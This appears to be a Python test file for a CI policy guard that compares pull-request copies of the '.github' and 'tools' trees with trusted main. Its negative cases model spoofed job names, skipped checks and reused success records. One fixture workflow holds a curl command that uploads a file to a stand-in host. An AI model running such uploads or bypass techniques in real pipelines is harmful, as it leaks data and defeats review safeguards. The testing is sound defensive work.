"""Issue #544 (child of #511): the trusted-main policy check, with the eight required negative cases (a)-(h).

Each case copies the trusted tree (.github and tools) into a temporary directory, makes one change in the candidate copy, and
asserts that policy_guard refuses it. Cases (a), (d), (e) and (f) also check check_record_problems, which models the ruleset:
the ruleset itself (required check name, integration ID, head SHA, no skip) is repository configuration, not code, and is
verified by the admin procedure in the child issue.
"""
from pathlib import Path
import json
import shutil
import sys
import tempfile
import unittest

HOST = Path(__file__).resolve().parent
sys.path.insert(0, str(Path(__file__).resolve().parents[2] / 'tools'))
import policy_guard as policy  # noqa: E402

REPO = Path(__file__).resolve().parents[2]
APP_ID = 15368   # the GitHub Actions app (the integration ID the ruleset pins)


def copy_policy_tree(dst):
    for rel in ('.github', 'tools'):
        shutil.copytree(REPO / rel, Path(dst) / rel, ignore=shutil.ignore_patterns('__pycache__'))


class PolicyCase(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.trusted = Path(self.tmp.name) / 'trusted'
        self.candidate = Path(self.tmp.name) / 'candidate'
        copy_policy_tree(self.trusted)
        copy_policy_tree(self.candidate)

    def append(self, rel, text):
        with (self.candidate / rel).open('a', encoding='utf-8') as handle:
            handle.write(text)

    def refused(self):
        return policy.check_candidate(self.candidate, self.trusted)


class Baseline(PolicyCase):
    def test_identical_candidate_passes(self):
        self.assertEqual(self.refused(), [])


class Cases(PolicyCase):
    def test_a_check_job_removed_from_pull_request_is_refused(self):
        (self.candidate / policy.POLICY_WORKFLOW).unlink()
        self.assertTrue(self.refused())
        self.assertTrue(policy.check_record_problems(None, 'h', APP_ID))

    def test_b_loosened_allowlist_is_refused(self):
        path = self.candidate / 'tools' / 'artifact_guard_run_allowlist.json'
        entries = json.loads(path.read_text(encoding='utf-8'))
        path.write_text(json.dumps(entries[1:]), encoding='utf-8')   # drop one approval: any change is refused
        self.assertTrue(policy.policy_files_match(self.candidate, self.trusted))

    def test_c_changed_guard_implementation_is_refused(self):
        self.append('tools/artifact_guard.py', '\n# loosened in the pull request\n')
        self.assertTrue(policy.policy_files_match(self.candidate, self.trusted))

    def test_d_fake_job_with_the_same_name_is_refused(self):
        fake = ('name: fake\non: [push]\npermissions:\n  contents: read\njobs:\n  policy-guard:\n'
                '    runs-on: ubuntu-24.04\n    steps:\n      - run: echo ok\n')
        (self.candidate / '.github' / 'workflows' / 'fake.yml').write_text(fake, encoding='utf-8')
        self.assertTrue(policy.policy_files_match(self.candidate, self.trusted))
        self.assertTrue(policy.check_record_problems({'name': 'policy-guard', 'head_sha': 'h', 'app_id': 1,
                                                      'conclusion': 'success'}, 'h', APP_ID))

    def test_e_reused_success_from_another_run_is_refused(self):
        record = {'name': 'policy-guard', 'head_sha': 'old-head', 'app_id': APP_ID, 'conclusion': 'success'}
        self.assertTrue(policy.check_record_problems(record, 'new-head', APP_ID))

    def test_f_skipped_by_workflow_edit_is_refused(self):
        path = self.candidate / policy.POLICY_WORKFLOW
        path.write_text(path.read_text(encoding='utf-8').replace('    runs-on: ubuntu-24.04',
                                                                  '    if: false\n    runs-on: ubuntu-24.04', 1),
                        encoding='utf-8')
        self.assertTrue(policy.policy_files_match(self.candidate, self.trusted))
        self.assertTrue(policy.check_record_problems({'name': 'policy-guard', 'head_sha': 'h', 'app_id': APP_ID,
                                                      'conclusion': 'skipped'}, 'h', APP_ID))

    def test_g_unapproved_send_command_is_refused(self):
        send = ('name: extra\non: [push]\npermissions:\n  contents: read\njobs:\n  send:\n    runs-on: ubuntu-24.04\n'
                '    steps:\n      - run: curl -F f=@out.txt https://example.invalid/up\n')
        (self.candidate / '.github' / 'workflows' / 'extra.yml').write_text(send, encoding='utf-8')
        self.assertTrue(policy.approval_problems(self.candidate, self.trusted))

    def test_h_changed_called_script_is_outside_the_unprivileged_closure(self):
        # Revised (Issue #544 review C-2): nightly.yml's plan job has no write permission, so its called script is not in the
        # privileged closure. The refusal for a changed called script is tested on a privileged job in
        # test_policy_guard_closure.py (cases 1-6). This boundary is an owner decision (see the C-3 procedure).
        self.append('tools/nightly_plan.sh', '\n# unprivileged job: documented boundary\n')
        self.assertEqual(policy.script_hash_problems(self.candidate, self.trusted), [])


class RecordModel(unittest.TestCase):
    def test_matching_successful_record_passes(self):
        record = {'name': 'policy-guard', 'head_sha': 'h', 'app_id': APP_ID, 'conclusion': 'success'}
        self.assertEqual(policy.check_record_problems(record, 'h', APP_ID), [])


if __name__ == '__main__':
    unittest.main()
